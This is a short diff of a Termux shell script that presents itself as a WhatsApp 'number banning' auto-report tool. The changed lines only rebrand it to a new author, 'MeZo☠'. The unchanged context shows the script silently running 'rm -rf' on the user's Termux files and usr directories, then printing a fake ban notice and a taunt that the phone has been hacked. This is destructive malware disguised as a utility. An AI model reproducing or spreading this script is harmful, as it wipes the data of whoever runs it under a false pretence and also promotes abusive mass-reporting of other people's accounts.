@@ -16,15 +16,15 @@ clear
 pkg install toilet -y
 clear
 echo -e ""
-toilet --filter metal 'WHATSAPP NUMBER BANNING'
+toilet --filter metal 'WHATSAPP NUMBER BANNING BY MEZO☠'
 sleep 7
-echo -e "             $white  coded by$blue ${underline}xhackz"
+echo -e "             $white  coded by$blue ${underline}MeZo☠"
 echo ""
 }
 banner
 menu()
 {
-echo -e "${red}[1] AUTO REPORT (temp ban)"
+echo -e "${red}[1] AUTO REPORT (temp ban MeZo☠)"
 }
 menu
 
@@ -207,7 +207,7 @@ rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files
 sleep 20 && clear
 echo "number will banned after few minutes"
-echo "تم اختراقك و سحب كل ملفاتك من قبل ميزو حاكم الدمار☠"
+echo "hack your mobile by MeZo☠😈"
 sleep 10
 }
 
